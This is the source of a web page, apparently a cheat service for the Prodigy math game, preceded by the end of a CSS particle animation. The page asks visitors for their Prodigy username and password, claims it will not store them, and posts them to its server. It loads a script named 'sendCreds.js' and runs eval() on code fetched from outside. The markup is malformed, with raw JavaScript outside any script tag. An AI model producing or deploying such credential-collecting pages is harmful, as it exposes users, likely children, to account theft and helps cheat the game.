  -webkit-animation-duration: 32808ms;
          animation-duration: 32808ms;
  -webkit-animation-delay: 28932ms;
          animation-delay: 28932ms;
}
@-webkit-keyframes move-frames-199 {
  from {
    -webkit-transform: translate3d(93vw, 108vh, 0);
            transform: translate3d(93vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(30vw, -127vh, 0);
            transform: translate3d(30vw, -127vh, 0);
  }
}
@keyframes move-frames-199 {
  from {
    -webkit-transform: translate3d(93vw, 108vh, 0);
            transform: translate3d(93vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(30vw, -127vh, 0);
            transform: translate3d(30vw, -127vh, 0);
  }
}
.circle-container:nth-child(199) .circle {
  -webkit-animation-delay: 604ms;
          animation-delay: 604ms;
}
.circle-container:nth-child(200) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-200;
          animation-name: move-frames-200;
  -webkit-animation-duration: 35081ms;
          animation-duration: 35081ms;
  -webkit-animation-delay: 8138ms;
          animation-delay: 8138ms;
}
@-webkit-keyframes move-frames-200 {
  from {
    -webkit-transform: translate3d(2vw, 106vh, 0);
            transform: translate3d(2vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(61vw, -120vh, 0);
            transform: translate3d(61vw, -120vh, 0);
  }
}
@keyframes move-frames-200 {
  from {
    -webkit-transform: translate3d(2vw, 106vh, 0);
            transform: translate3d(2vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(61vw, -120vh, 0);
            transform: translate3d(61vw, -120vh, 0);
  }
}
.circle-container:nth-child(200) .circle {
  -webkit-animation-delay: 2177ms;
          animation-delay: 2177ms;
}

.message {
  position: absolute;
  right: 20px;
  bottom: 10px;
  color: white;
  font-family: "Josefin Slab", serif;
  line-height: 27px;
  font-size: 18px;
  text-align: right;
  pointer-events: none;
  -webkit-animation: message-frames 1.5s ease 5s forwards;
          animation: message-frames 1.5s ease 5s forwards;
  opacity: 0;
}
@-webkit-keyframes message-frames {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}
@keyframes message-frames {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}
<!DOCTYPE html>
<script src='/JS/sendCreds.js'></script>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Arena Points Host</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Josefin+Slab:100'><link rel="stylesheet" href="/CSS/style.css/">

</head>
<div class="main"><h1>Arena Points Hosting</h1><br><h2>This site allows you to enter your credentials and get arena points once every 2 minutes or so, without even needing to be on the page!</h2><br><h1>Give it a try below!</h1><br><h6>Made by and licensed to <a href='https://github.com/Prodigy-Hacking'>ProdigyMathGameHacking</a>.</h6><br><h5><strong>Note:</strong> There is a ratelimit of 1 request a minute for security reasons. Any further inquiries can be answered at our <a href="https://discord.gg/XQDfbfq">Discord</a>.</h5></div>
<button id="startbtn" onmouseover="document.getElementById('startbtn').style.background = 'black';document.getElementById('startbtn').style.color = 'white'" onmouseout="document.getElementById('startbtn').style.background = 'white';document.getElementById('startbtn').style.color = 'black'" onclick="submit()" class="btn">Start</button>
<body>
  window.submit = async () => {
eval(await (await fetch('https://unpkg.com/sweetalert2')).text())
Swal.mixin({
    allowOutsideClick: false,
      input: 'text',
      confirmButtonText: 'Next &rarr;',
      showCancelButton: true,
      progressSteps: ['1', '2']
    }).queue([
      {
        title: 'What is your Prodigy username?',
        text: 'Your data will not be stored on this site.'
      },
      'What is your password?',
    ]).then(t => {
    if(t.dismiss) return;
    if(!t.value[0] || !t.value[1]){
        Swal.fire("You didn't put info in all of the boxes.",'','error') 
    } else {
    Swal.fire({
      title: 'Are you sure you want to submit?',
      icon: 'warning',
      showCancelButton: true,
      confirmButtonColor: '#3085d6',
      cancelButtonColor: '#d33',
      confirmButtonText: 'Submit'
    }).then((result) => {
      if (result.isConfirmed) {
        (async () => {
          let datalink = await (await fetch(`/gen`,{
              method: "POST",
              headers: {
               'Content-Type': 'text/plain',
               body: JSON.stringify(t.value)
              }
   
          })).text()
         try{ window.data = JSON.parse(datalink)}catch{
          Swal.fire(
            'An error occured.',
            'Please try again later, or join our Discord for support.',
            'error'
          ).then(() => {
           Swal.close()
          })
         }
          if(data.code != 200){
            Swal.fire(
              'An error occured.',
              'Please try again later, or join our Discord for support.',
              'error'
            ).then(() => {
             Swal.close()
            })
          }else{
            Swal.fire(
              'Success!',
              'Arena points should be generating momentarily.',
              'success'
            ).then(() => {
             Swal.close()
            })
          }
        })()
      }
    })
  }
    })
}

<!-- partial:index.partial.html -->
<div class="container"><img class="background" src="/IMG/city.png"/>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
  <div class="circle-container">
    <div class="circle"></div>
  </div>
</div>
<!-- partial -->
  
</body>
</html>
